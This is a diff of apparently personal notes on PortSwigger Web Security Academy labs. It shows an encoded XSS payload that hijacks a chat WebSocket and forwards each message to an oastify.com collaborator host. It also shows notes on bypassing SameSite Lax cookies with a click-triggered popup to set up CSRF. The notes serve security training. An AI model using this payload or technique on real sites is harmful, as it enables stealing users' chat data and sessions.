@@ -272,7 +272,7 @@ cms-LAB-ID.web-security-academy.net
 
 Example:
 
-/login?username=<payload>&password=x
+/login?username=<payload></payload>&password=x
 
 ---
 
@@ -314,3 +314,21 @@ exmaple of final payload that was used
 document.location="https://cms-0ad1004b0488443f80bb08aa0071004f.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%22%77%73%73%3a%2f%2f%30%61%64%31%30%30%34%62%30%34%38%38%34%34%33%66%38%30%62%62%30%38%61%61%30%30%37%31%30%30%34%66%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%22%29%3b%0a%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%20%73%74%61%72%74%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%7d%0a%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%20%68%61%6e%64%6c%65%52%65%70%6c%79%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%6c%33%70%75%32%39%6d%71%68%67%75%34%64%6d%72%37%36%32%73%35%64%6f%6c%6c%6b%63%71%39%65%30%32%70%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%2f%3f%27%2b%65%76%65%6e%74%2e%64%61%74%61%2c%20%7b%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%7d%29%3b%0a%20%20%7d%0a%3c%2f%73%63%72%69%70%74%3e&password=2321320"
 
 </script>
+
+
+
+
+Bypassing SameSite Lax restrictions with newly issued cookies - 
+=
+
+ trigger the cookie refresh without the victim having to manually log in again, you need to use a top-level navigation, which ensures that the cookies associated with their current OAuth session are included. This poses an additional challenge because you then need to redirect the user back to your site so that you can launch the CSRF attack.
+
+Alternatively, you can trigger the cookie refresh from a new tab so the browser doesn't leave the page before you're able to deliver the final attack. A minor snag with this approach is that browsers block popup tabs unless they're opened via a manual interaction. For example, the following popup will be blocked by the browser by default:
+window.open('https://vulnerable-website.com/login/sso');
+
+To get around this, you can wrap the statement in an onclick event handler as follows:
+window.onclick = () => {
+    window.open('https://vulnerable-website.com/login/sso');
+}
+
+This way, the window.open() method is only invoked when the user clicks somewhere on the page. 
